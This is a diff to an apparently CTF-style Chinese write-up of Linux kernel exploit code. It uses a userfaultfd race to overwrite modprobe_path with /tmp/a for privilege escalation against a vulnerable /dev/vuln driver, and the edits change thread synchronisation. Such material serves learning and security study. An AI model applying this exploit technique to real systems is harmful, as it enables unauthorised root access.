@@ -899,6 +899,7 @@ uint64_t glen1, glen2, glen3, glen4;
  *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`
  * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f
  *
+ *
  * 参考: https://www.anquanke.com/post/id/232545#h3-6
  */
 void modprobe_exp()
@@ -941,6 +942,7 @@ void modprobe_exp()
  *      2. userfaultfd保护机制被关闭，即
  * /proc/sys/vm/unprivileged_userfaultfd 被设置为1
  *
+ *
  * 参数:
  *      1. @addr是通过mmap(NULL, len, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
@@ -951,6 +953,12 @@ void modprobe_exp()
  *      3. @handler为自定义的userfaultfd handler，其会在内核进程触发
  * page fault时，在userfaultfd_handler中被调用。其接受@page为参数，@page页
  * 内容在调用完@handler后，被用于初始化分配给内核进程的页
+ *
+ *
+ * 返回值:
+ *      @ret返回@thread创建的pthread_t，用于进程同步. 在直白一些，通过调用
+ * pthread_join(@ret)，确保@thread已经触发page fault，并且@handler已经被执行结束
+ *
  *
  * 参考: https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/
  */
@@ -1004,7 +1012,7 @@ static void * userfaultfd_handler(void *arg)
     return NULL;
 }
 
-void userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
+pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
                      void *(*handler)(void *page))
 {
     int uffd;
@@ -1039,6 +1047,8 @@ void userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
 
     printf("[userfaultfd_exp] create the thread to trigger the page fault\n");
     assert(pthread_create(&thr, NULL, thread, NULL) != -1);
+
+    return thr;
 }
 
 
@@ -1061,6 +1071,7 @@ void *uf_handler(void *page)
     Data *data = (Data *)page;
     data->addr = modprobe_path;
     data->val = fake_modprobe_path;
+    sleep(5);
     return NULL;
 }
 
@@ -1094,6 +1105,7 @@ int main(void)
     //Data data;
     //long long buf;
     //uint64_t len;
+    //pthread_t thread;
 
     //len = 0x1000;
     //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);
@@ -1102,7 +1114,7 @@ int main(void)
     //assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,
     //                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))
     //       != MAP_FAILED);
-    //userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);
+    //thread = userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);
 
     //// 此时page fault还未处理完，条件竞争读取modprobe_path值
     //data.addr = modprobe_path;
@@ -1111,11 +1123,10 @@ int main(void)
     //assert(buf != fake_modprobe_path);
 
     //// 等待uf_thr终止
-    //sleep(2);
+    //assert(pthread_join(thread, NULL) == 0);
     //modprobe_exp();
     return 0;
 }
-
 ```
 
 ## 调试环境
